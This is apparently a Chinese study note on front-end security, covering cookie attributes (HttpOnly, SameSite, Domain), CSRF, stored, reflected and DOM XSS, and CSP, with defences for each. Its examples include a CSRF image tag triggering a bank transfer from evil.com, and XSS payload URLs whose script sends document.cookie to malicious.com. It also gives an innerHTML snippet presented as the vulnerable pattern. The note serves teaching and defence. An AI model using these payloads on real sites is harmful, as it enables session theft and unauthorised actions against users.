四、前端安全性相关-攻击方式-预防-cookie设置属性
## 1.Cookie相关与HttpOnly


1. **什么是`HttpOnly`？为什么我们需要它？**

`HttpOnly` 是一个用于设置 HTTP Cookie 的属性，它的作用是限制客户端（通常是浏览器）对 Cookie 的访问，只允许通过 HTTP 或 HTTPS 协议进行访问，而禁止通过脚本（如 JavaScript）进行访问。

使用 `HttpOnly` 属性可以提高 Web 应用程序的安全性：防止跨站脚本攻击（XSS）：浏览器将禁止 JavaScript 访问带有该属性的 Cookie


2. **除了`HttpOnly`，哪些其他标志或属性可以提高Cookie的安全性？**


- `Secure` 属性：只允许通过 HTTPS 连接传输 Cookie。

- `SameSite` 属性：`SameSite` 属性用于定义 Cookie 发送的规则，以防止跨站点请求伪造（CSRF）攻击。可以将 `SameSite` 属性设置为以下值之一：`Strict`、`Lax` 或 `None`。`Strict` 模式完全禁止跨站点发送 Cookie，`Lax` 模式在导航到目标站点之前仅允许在安全上下文(指顶导)中发送 Cookie，而 `None` 模式允许在任何情况下发送 Cookie（需要同时设置 `Secure` 属性）。使用适当的 `SameSite` 设置可以限制 Cookie 的发送范围，减少 CSRF 攻击的风险。

- `Domain` 属性：通过设置 `Domain` 属性，可以限制 Cookie 的作用域。将 `Domain` 属性设置为与当前网站的主域名匹配，可以防止恶意网站访问到另一个网站的 Cookie。这可以提高 Cookie 的隔离性和安全性。

- `Path` 属性：设置Cookie的可发送路径。这样可以防止其他路径下的恶意脚本访问和窃取 Cookie。

- 定期更新和轮换 Cookie：定期更改敏感 Cookie 的值，增加攻击者窃取 Cookie 的难度。同时，使用有限的有效期限制 Cookie 的生命周期。

- CSP（内容安全策略）：通过 CSP，可以定义网页可以加载的资源源，限制恶意脚本的执行和 Cookie 的访问。


```javascript
res.cookie('cookieName', 'cookieValue', { 
  httpOnly: true,
  secure: true,
  sameSite: 'Strict',
  domain: 'example.com',
  path: '/'
});
```


**`SameSite`场景：**
那我如果设置SameSite中的Strict，那是不是完全禁止跨站点发送 Cookie。也就是在evil.com里面点<img src="https://img-home.csdnimg.cn/images/20230724024159.png?origin_url=https%3A%2F%2Fbank.com%2Ftransfer%3Fto%3Dattacker%26amount%3D1000&pos_id=img-kXng9Qhn-1694418053406)" width="0" height="0">。也不会携带cookie了？

SameSite` 属性是一个相对较新的 Cookie 属性，用于增强浏览器中的跨站点请求的安全性。该属性有三个可能的值：`Strict`、`Lax` 和 `None`。

- 当设置为 `SameSite=Strict` 时，该 Cookie 仅在请求来自同一站点时发送。这意味着，即使用户已经在 `bank.com` 上登录，如果他们访问了 `evil.com` 并从那里尝试通过 `<img>` 标签或任何其他方式触发一个跨站点请求，浏览器将不会附带与 `bank.com` 相关的任何 `SameSite=Strict` 的 Cookie。

- `SameSite=Lax` 是一个稍微宽松一点的版本，它允许一些安全的跨站点请求（例如GET请求）携带 Cookie，但不允许跨站点的 POST 请求携带 Cookie。这可以避免许多 CSRF 攻击，同时仍然允许某些跨站点的使用场景。

- `SameSite=None` 意味着 Cookie 可以在任何跨站点请求中发送，但这需要与 `Secure` 标志一起使用，这意味着 Cookie 只能通过 HTTPS 发送。

为了增强安全性，许多现代浏览器已经开始更改其对 `SameSite` 的默认行为，将其默认设置为 `Lax`。这就是为什么在某些场景中，如果没有明确设置 `SameSite` 属性，您可能会看到一些关于 Cookie 行为的变化。

综上所述，设置 `SameSite=Strict` 确实可以大大减少 CSRF 攻击的风险，因为它会完全阻止跨站点发送 Cookie。



**如何理解Samesite = Lax?：**

1. 假设用户已登录`bank.com`并获取了一个带有`SameSite=Lax`属性的cookie。
2. 用户访问一个第三方的恶意网站`evil.com`。
3. 在`evil.com`上有一个尝试利用CSRF漏洞发起的XHR请求，目标是`bank.com/transferMoney`。由于cookie设置为`Lax`，这个跨站XHR请求不会携带`bank.com`的cookie，从而防止了潜在的CSRF攻击。
4. 但是，如果用户在`evil.com`上点击一个指向`bank.com`的链接，由于这是一个**顶层导航请求**，`bank.com`的cookie将会被发送，尽管是从`evil.com`触发的。

**总结：转账请求不携带cookie，顶层导航请求携带cookie，从而确保不破坏用户的正常浏览体验.**




**SameSite与Secure的不同：**
- `SameSite` 属性用来控制 Cookie 是否能够在**跨站请求中被发送**。
- `Secure` 属性确保 Cookie **只能通过 HTTPS 协议发送**。

**如何理解Domain属性？：**

`Domain`属性在Cookie中定义了**哪些域名可以访问该Cookie**。它有助于定义Cookie的范围。

默认情况下，Cookie只能**被创建它的页面所访问**。但是，如果你设置了`Domain`属性，这个Cookie就可以被此域下的其他**子域**所访问。

**那cookie的domain属性，能解决cookie的跨域问题吗？**
回到你的问题，domain 属性解决的其实**不是通常意义上的“跨域问题”，而是主域下的子域名共享问题**。跨完全不同的域（例如 example.com 和 another.com）之间是无法共享 cookie 的，无论如何设置 domain 属性。如果你需要在完全不同的域名之间共享信息，你可能需要使用其他方法，如 **JSONP、CORS 或服务器间的通信**。

**如何在JavaScript中设置和读取Cookies？**

在JavaScript中，可以使用`document.cookie`属性来读取和设置cookies。




## 2.前端安全性相关

### **a.描述什么是CSRF(跨站请求伪造）？**

**CSRF(跨站请求伪造**：攻击者诱使受害者的浏览器执行未经授权的请求，通常是在受害者已经登录目标站点并在其会话中持有有效凭据的情况下。简而言之，CSRF攻击的目标是利用受害者当前的身份来执行某些操作，而受害者通常不会意识到这些操作的发生。

**CSRF 攻击简化流程**：

1. **目标**：攻击者希望攻击某个受害者在网站 `bank.com` 上的账户，该受害者在 `bank.com` 有登录状态。

2. **建立陷阱**：攻击者在一个他控制的网站 `evil.com` 上放置了一个恶意脚本或者构造了一个看起来正常的链接。这个链接或脚本其实是向 `bank.com` 发送一个请求。

   例如：`<img src="https://img-home.csdnimg.cn/images/20230724024159.png?origin_url=https%3A%2F%2Fbank.com%2Ftransfer%3Fto%3Dattacker%26amount%3D1000&pos_id=img-kXng9Qhn-1694418053406)" width="0" height="0">`

   当受害者访问 `evil.com` 时，上述链接会尝试向 `bank.com` 发起一个转账请求。

3. **利用用户登录状态**：如果受害者在 `bank.com` 处于登录状态，并且其浏览器还有 `bank.com` 的 Cookie，这个请求就会带上这个 Cookie，因为浏览器会自动附带相应站点的 Cookie。从 `bank.com` 的角度看，这个请求看起来是一个合法的用户请求。

4. **完成攻击**：如果 `bank.com` 没有进行 CSRF 保护，它会执行这个恶意请求，将受害者的钱转到攻击者的账户。

**如何防范 CSRF 攻击**：

1. **使用 CSRF 令牌**：为每个会话和请求生成一个随机的、不可预测的令牌。只有在收到正确的令牌时，服务器才会处理请求。

2. **检查 Referer 标头**：如果请求的来源不是预期的域（例如从 `evil.com` 来的请求），那么可以拒绝该请求。

3. **强制重新认证**：对于敏感的操作（如转账），要求用户再次输入密码或进行其他形式的二次认证。

4. **设置cookie中的sameSite**：限制跨站点携带cookie


**我的问题：**
cookie默认情况就是不跨域的，为什么受害者访问 evil.com 时点击了链接能发送bank.com 的 Cookie？

问题的核心并不在于 cookie 是否可以在不同的域之间"共享"，而在于浏览器的行为和如何处理带有 cookie 的请求。


这就是 CSRF 攻击的核心：**它不是试图窃取或直接利用 Cookie，而是利用浏览器的这种自动行为来执行未经授权的操作**。


### **b.描述什么是跨站脚本攻击（XSS）？**

跨站脚本攻击（Cross-Site Scripting，简称 XSS）是一种在 web 应用中插入恶意脚本的攻击方式。攻击者利用这种攻击方法可以执行任意的脚本代码，并借此获得对网站或其用户的非法访问权限。XSS 攻击的成功往往是因为网站未能正确地过滤用户输入的内容。

以下是关于 XSS 攻击的详细描述：

1. **工作原理**：
   - 攻击者在 web 应用的某个地方插入恶意 JavaScript 代码。
   - 当其他用户浏览这个被植入了恶意代码的页面时，他们的浏览器会执行这段代码。
   - 一旦代码被执行，攻击者就可以利用这段代码实现多种恶意行为，如窃取 cookie、生成伪造请求或展示虚假信息。

2. 对于 XSS（跨站脚本攻击），理解其三个主要类型是非常重要的。每种类型的攻击都基于相同的核心概念，即将恶意脚本注入到受害者的浏览器中并执行，但是它们的执行方式和攻击点存在差异。以下是对三种类型的更深入解释：

3. **三种XSS：**
**存储型 XSS**：
   - **机制**：这是最常见的 XSS 攻击形式。在这种攻击中，恶意脚本被永久保存在目标服务器上。当用户请求该数据（例如，读取一篇论坛帖子或查看评论）时，服务器将数据连同恶意脚本一起发送给用户的浏览器，然后在浏览器中执行该脚本。
   - **示例**：一个用户在社交网站上发布了一个评论，其中嵌入了恶意脚本。每当有人查看这条评论时，该脚本就会在他们的浏览器中执行。
   - **风险**：存储型 XSS 攻击是持续的，除非恶意内容从服务器上删除，否则每个访问该内容的用户都可能受到攻击。

 **反射型 XSS**：
   - **机制**：与存储型 XSS 不同，反射型 XSS 中的恶意脚本并不存储在服务器上。相反，攻击者通常会将恶意脚本放在 URL 中，然后诱导受害者点击这个 URL。当用户点击该链接时，请求发送到服务器，服务器将恶意脚本作为响应的一部分返回，然后在用户的浏览器中执行。
   - **示例**：攻击者发送了一个伪装成合法网站链接的电子邮件。该链接的 URL 中含有恶意脚本。当用户点击该链接时，服务器简单地将该脚本反射回用户的浏览器，并执行它。
   - **风险**：该攻击是一次性的，只有点击恶意链接的用户会受到攻击。

 **DOM 型 XSS**：
   - **机制**：这种类型的攻击主要涉及页面的 DOM（文档对象模型）。在这里，服务器可能返回无害的数据，但由于前端脚本的不恰当处理，恶意输入可能会被执行为脚本。这种攻击主要利用了客户端（如 JavaScript）在处理用户输入时的缺陷。
   - **示例**：考虑一个搜索功能，用户的搜索词会被显示在搜索结果中。如果前端 JavaScript 代码简单地将 URL 中的搜索参数获取出来，并直接插入到页面中，那么攻击者可以在 URL 的搜索参数中插入恶意脚本，从而在其他用户的浏览器中执行该脚本。
   - **风险**：与反射型 XSS 类似，这种攻击通常需要诱骗用户执行某些操作（例如，点击链接或访问某个页面）。

为了避免 XSS 攻击，开发者需要确保在将用户输入的数据插入到 web 页面之前，对其进行适当的验证和转义。此外，内容安全策略（CSP）和其他现代浏览器安全措施也可以帮助降低 XSS 攻击的风险。

3. **预防方法**：
   - 对所有用户输入进行严格的验证和过滤。
   - 使用适当的输出编码，确保动态内容在页面中被安全地呈现。
   - 使用内容安全策略（Content Security Policy, CSP）限制可执行的脚本。
   - 避免使用或限制使用能解析并执行代码的函数，如 `eval()`。
   - 对敏感的 cookie 设置 `httpOnly` 属性，这样即使脚本尝试访问 cookie，浏览器也不会返回这些 cookie 的内容。

**DOM型XSS攻击详解：**
我将为您描述一个具体的 DOM 型 XSS 攻击的例子。

**场景：** 假设我们有一个简单的搜索引擎网站，它使用 JavaScript 从 URL 的查询参数中获取用户输入的搜索关键词，然后直接将其显示在搜索结果页面上。以下是这个操作的简化版 JavaScript 代码：

```javascript
// 获取 URL 中 "q" 参数的值
let userQuery = new URLSearchParams(window.location.search).get('q');

// 直接在页面上显示搜索关键词
document.getElementById('search-result').innerHTML = "您搜索的是：" + userQuery;
```

**攻击过程：**

1. 攻击者注意到这个网站直接从 URL 的 `q` 参数中获取数据，并不经过任何过滤或转义就将其插入到页面中。
2. 攻击者构建以下 URL，其中包含一个恶意的 JavaScript 脚本作为 `q` 参数的值：

```js
http://example.com/search?q=<script>fetch('http://malicious.com/steal?cookie='+document.cookie)</script>
```

3. 攻击者将这个恶意链接分享到社交媒体、论坛或通过其他方式诱导受害者点击。
4. 当受害者点击此链接时，他们的浏览器会打开这个搜索引擎网页。因为网页中的 JavaScript 代码没有进行任何数据验证或转义，所以 `<script>` 标签中的恶意代码会被执行。
5. 恶意脚本将受害者的 cookie 信息发送到攻击者控制的 `malicious.com` 域名。

**防御措施：**

要防止 DOM 型 XSS 攻击，网站开发者可以采取以下措施：

1. 永远不要信任用户输入。即使数据是从 URL、表单、Cookies 或任何其他来源获取的，也应对其进行验证和转义。
2. 使用 `.textContent` 或其他安全方法，而不是使用 `.innerHTML` 来插入数据，因为 `.innerHTML` 可能会执行嵌入其中的脚本。
3. 使用内容安全策略 (CSP) 来限制哪些脚本可以被执行。
4. 了解并使用现代 JavaScript 框架（如 React、Vue 或 Angular）提供的内置 XSS 防护机制。



**反射性XSS详解：**
我将为您描述一个具体的反射型 XSS 攻击的例子。

**场景：** 假设有一个网站，该网站允许用户通过 URL 的查询参数来自定义欢迎消息。例如，当用户访问 `http://example.com/welcome?name=Alice` 时，网站会显示“Hello, Alice!”。该网站的后端代码简单地从 URL 获取 `name` 参数，并将其嵌入到返回给用户的 HTML 页面中。

**攻击过程：**

1. 攻击者发现这个功能并意识到网站没有过滤或转义 `name` 参数的值。
2. 攻击者构建以下 URL，其中包含一个恶意的 JavaScript 脚本作为 `name` 参数的值：

```
http://example.com/welcome?name=<script>fetch('http://malicious.com/steal?cookie='+document.cookie)</script>
```

3. 攻击者通过电子邮件、社交媒体、或其他方法将这个恶意链接发送给受害者，试图诱骗他们点击。
4. 当受害者点击该链接时，他们的浏览器会请求上述网址，服务器简单地将 `<script>` 标签中的恶意代码作为响应的一部分返回给受害者的浏览器。
5. 由于该代码被嵌入到返回的 HTML 页面中，所以它会在受害者的浏览器中执行，导致恶意脚本将受害者的 cookie 信息发送到攻击者控制的 `malicious.com` 域名。

**防御措施：**

要防止反射型 XSS 攻击，网站开发者可以采取以下措施：

1. 永远不要信任用户输入。无论数据来源如何，都应对其进行验证、清理和转义。
2. 使用HttpOnly属性：会话cookie，使用HttpOnly标志。这样的cookie不能通过JavaScript访问，从而增加了安全性。
3. 使用内容安全策略 (CSP) 来限制可执行的脚本，尤其是来自外部源的脚本。
4. 考虑使用现代 web 开发框架，如 React、Vue 或 Angular，因为它们通常提供了防止 XSS 的内置机制。

这只是反射型 XSS 的一个简化示例，但它提供了一个关于如何进行这种攻击和如何进行防御的基本概念。

**DOM型与反射型的区别？**
您的困惑是可以理解的，因为反射型 XSS 和 DOM 型 XSS 在某些方面确实很相似，特别是它们都涉及从 URL 获取恶意载荷并在用户的浏览器中执行。但它们之间存在一些关键的区别：

1. **数据的处理位置**：
   - **反射型 XSS**：攻击载荷首先被发送到服务器，然后服务器将载荷反射回（即响应）客户端，并在返回的页面中执行该载荷。换句话说，服务器在处理用户输入并生成响应时，对恶意载荷进行了回显。
   - **DOM 型 XSS**：恶意载荷完全在客户端（浏览器）中处理。服务器可能会收到攻击载荷，但并不直接将其嵌入到返回的 HTML 中。相反，是客户端的 JavaScript 代码从 URL、DOM 或其他客户端的资源中获取载荷，并在页面上执行它。

2. **服务器的作用**：
   - **反射型 XSS**：服务器在这种攻击中起到了关键作用，因为它回显了攻击载荷。如果您捕获并查看服务器的响应，您应该能够看到恶意脚本。
   - **DOM 型 XSS**：攻击完全在浏览器端发生，服务器端的响应通常不包含恶意脚本。攻击载荷是由浏览器端的代码（如 JavaScript）处理并执行的。

3. **防御方法**：
   - **反射型 XSS**：需要确保服务器正确地验证、清理和转义所有从用户接收的数据，然后再将其插入到返回的 HTML 中。
   - **DOM 型 XSS**：除了服务器端的防御措施外，还需要确保客户端的 JavaScript 代码不会不安全地处理和执行用户数据。


### **c.内容安全策略CSP是什么？**

内容安全策略（Content Security Policy，CSP）是一个非常强大的安全特性，用于减少跨站脚本攻击（XSS）和其他代码注入攻击的风险。当你深入学习CSP时，以下是一些核心方面和概念，你应该重点了解：

1. **CSP的基本概念**：
   - **目的**：CSP是一个强大的工具，可以帮助网站所有者增加对站点内容的控制，从而减少受到各种攻击的风险。
   - **工作方式**：CSP是通过定义内容来源白名单来限制资源加载的。

2. **指令**：CSP包含了多种指令来控制不同类型的资源的加载：
   - `default-src`: 默认策略，如果没有指定其他指令，该策略会被使用。
   - `script-src`: 控制脚本的来源。
   - `style-src`: 控制样式表的来源。
   - `img-src`: 控制图像的来源。
   - `font-src`: 控制字体的来源。
   - `connect-src`: 控制与哪些服务器可以建立连接（例如使用fetch或XHR）。
   - `frame-src`: 控制可以嵌入页面的iframe的来源。
   - …以及更多其他指令。

3. **来源值**：
   - `'self'`: 只允许从同源加载。
   - `'unsafe-inline'`: 允许内联脚本和样式。
   - `'unsafe-eval'`: 允许使用eval()和相关函数。
   - `nonce-`: 允许指定一个随机令牌，只有与此令牌匹配的脚本或样式才会被执行。
   - `hash-`: 允许基于内容哈希值的特定脚本或样式。

4. **报告**：
   - `report-uri`: 如果有违反CSP策略的加载尝试，告诉浏览器将违规报告发送到哪里。
   - `report-to`: 新的报告端点定义，它更灵活并取代了`report-uri`。

5. **模式**：了解CSP可以工作在两种主要模式：
   - **强制模式**：不符合策略的内容不会被加载或执行。
   - **报告模式**：不符合策略的内容会被加载和执行，但会向指定的URL发送违规报告。


